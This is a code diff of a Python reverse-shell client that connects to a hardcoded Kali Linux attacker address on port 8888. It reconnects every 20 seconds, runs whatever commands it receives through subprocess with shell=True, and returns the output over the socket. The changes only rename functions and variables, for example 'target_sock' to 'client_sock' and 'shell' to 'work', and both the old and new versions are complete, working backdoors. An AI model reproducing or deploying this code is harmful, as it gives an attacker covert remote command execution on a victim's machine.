@@ -8,37 +8,37 @@ SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
 SERVER_PORT = 8888
 
 
-def reliable_send(data):
+def send(data):
     json_data = json.dumps(data)
-    target_sock.send(json_data.encode())
+    client_sock.send(json_data.encode())
 
 
-def reliable_recv():
+def recv_command():
     data = ''
     while True:
         try:
-            data = data + target_sock.recv(1024).decode().rstrip()
+            data = data + client_sock.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
 
 
-def connection():
+def create_connection():
     while True:
         time.sleep(20)
         try:
-            target_sock.connect((SERVER_IP, SERVER_PORT))
-            shell()
-            target_sock.close()
+            client_sock.connect((SERVER_IP, SERVER_PORT))
+            work()
+            client_sock.close()
             break
         except:
-            connection()
+            create_connection()
 
 
-def shell():
+def work():
     while True:
-        command = reliable_recv()
-        if command == 'quit':
+        command = recv_command()
+        if command == 'quit' or command == 'exit':
             break
         elif command == 'clear':
             pass
@@ -47,10 +47,10 @@ def shell():
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
-            result = execute.stdout.read() + execute.stderr.read()
-            result = result.decode()
-            reliable_send(result)
+            output = execute.stdout.read() + execute.stderr.read()
+            output = output.decode()
+            send(output)
 
 
-target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection()
+client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+create_connection()
